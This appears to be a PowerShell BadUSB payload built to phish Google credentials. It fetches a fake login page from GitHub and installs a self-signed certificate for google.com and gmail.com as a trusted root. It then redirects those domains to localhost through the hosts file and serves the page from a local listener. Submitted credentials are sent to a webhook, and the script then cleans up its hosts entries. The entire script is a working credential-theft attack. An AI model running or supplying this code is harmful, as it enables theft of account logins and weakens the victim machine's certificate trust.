if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
    Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;

    $dnsNames = "localhost", "google.com", "*.google.com", "gmail.com";
    $cert = New-SelfSignedCertificate -DnsName $dnsNames -CertStoreLocation "cert:\LocalMachine\My" -KeySpec Signature -HashAlgorithm SHA256 -KeyExportPolicy Exportable  -NotAfter (Get-Date).AddYears(20)

    $thumbprint = $cert.Thumbprint
    Export-Certificate -Cert "cert:\localmachine\my\$thumbprint" -FilePath "$env:temp\gph.cer" -Force

    Import-Certificate -filePath "$env:temp\gph.cer" -CertStoreLocation "cert:\LocalMachine\Root"
    Write-Output $thumbprint
}

$hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;

if ($null -eq $isModified ) {    
    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
    ipconfig /flushdns;
}

$url = '127.0.0.1';
$hook="";
$pageCode = Get-Content "$env:temp\gph.html" -Encoding UTF8 -Raw;

function Handle-Request{    
    [CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$True)]
		[System.Net.HttpListener]$listener
	);

    $context = $listener.GetContext();  
     
    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {
        $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();    
    }

    if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
        $data = @{
            content = [System.IO.StreamReader]::new($context.Request.InputStream).ReadToEnd()
        } | ConvertTo-Json;
        
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hook  -Method Post -Body $data | Wait-Process;

        (Get-Content C:\Windows\System32\Drivers\etc\hosts | Select-String -pattern $hostString -notmatch) | Set-Content C:\Windows\System32\Drivers\etc\hosts;
        ipconfig /flushdns;

        $buffer = [Text.Encoding]::UTF8.GetBytes("");
        $context.Response.Headers.Add("Content-Type","text/plain");
        $context.Response.ContentLength64 = $buffer.length;
        $context.Response.StatusCode = 200;
        $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
        $context.Response.Close();

        $listener.Stop();
    }
}

$http = New-Object System.Net.HttpListener;
$http.Prefixes.Add(('http://' + $url + ':80/'));
$http.Prefixes.Add(('https://' + $url + ':443/'));
$http.Start();

while ($http.IsListening) {
    Handle-Request $http
}